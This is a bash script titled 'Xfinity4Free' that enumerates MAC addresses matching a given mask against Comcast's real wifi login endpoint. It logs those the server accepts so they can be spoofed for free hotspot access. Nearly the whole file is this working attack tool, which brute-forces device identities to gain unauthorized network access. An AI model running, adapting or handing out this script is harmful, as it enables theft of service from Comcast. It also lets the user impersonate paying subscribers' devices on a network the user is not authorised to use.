#!/bin/bash
# Xfinity4Free - Script to mine for valid Xfinity wifi hotspot MAC addresses
# Scott Muller <scott@21h.io>
#
# 

echo
echo ".-=[ Xfinity public wifi miner by scott@21h.io ]=-." 
echo

usage() {
 echo "Usage:"
 echo " ./xfinity4free.sh [MASK]"
 echo
 echo "Example:"
 echo " ./xfinity4free.sh 4c:b1:99:27:xx:xx"
 echo
}

cleanup() {
 rm -f ./wispr_resp
 exit $?
}

if [ $# -ne 1 ]
then
 usage
 exit 1
fi

trap cleanup SIGINT

_MASK="$1"
MASK=`echo $_MASK | tr -d "\r\n " | tr '[:lower:]' '[:upper:]'`

echo "Starting scan of $MASK ..."
echo

HEXNUMS=`grep -o "X" <<< "$MASK" | wc -l | tr -d "\r\n "`
HEXMAX=`echo "(16^""$HEXNUMS"")-1" | bc | tr -d "\r\n "`
for x in `seq 0 $HEXMAX`
do
 _HEX=$( printf '%.12X' $x | tr -d "\r\n " )
 POS=11
 HEX=""
 for xx in `seq 16 -1 0`
 do
  H="${MASK:xx:1}"
  if [[ "$H" == "X" ]]
  then
   H="${_HEX:POS:1}"
   let POS=POS-1
  fi
  HEX="$H""$HEX"
 done
 if ! grep -q "$HEX" TESTED_MACS 2>/dev/null
 then
  echo -n "[$HEX] "
  rm -f ./wispr_resp
  wget -O ./wispr_resp "https://wifilogin.comcast.net/wifi/wispr_login.php?cm=$HEX" 2>/dev/null
  if grep -q "<ResponseCode>50</ResponseCode>" ./wispr_resp
  then 
   beep
   echo
   echo
   echo "***** Thanks, Comcast!    *****"
   echo "      Free Wifi with MAC: "
   echo "      $HEX "
   echo 
   echo "$HEX" >> VALID_MACS
  fi
  if [ -e ./wispr_resp ]
  then
   echo "$HEX" >> TESTED_MACS
  fi
 fi
done

cleanup

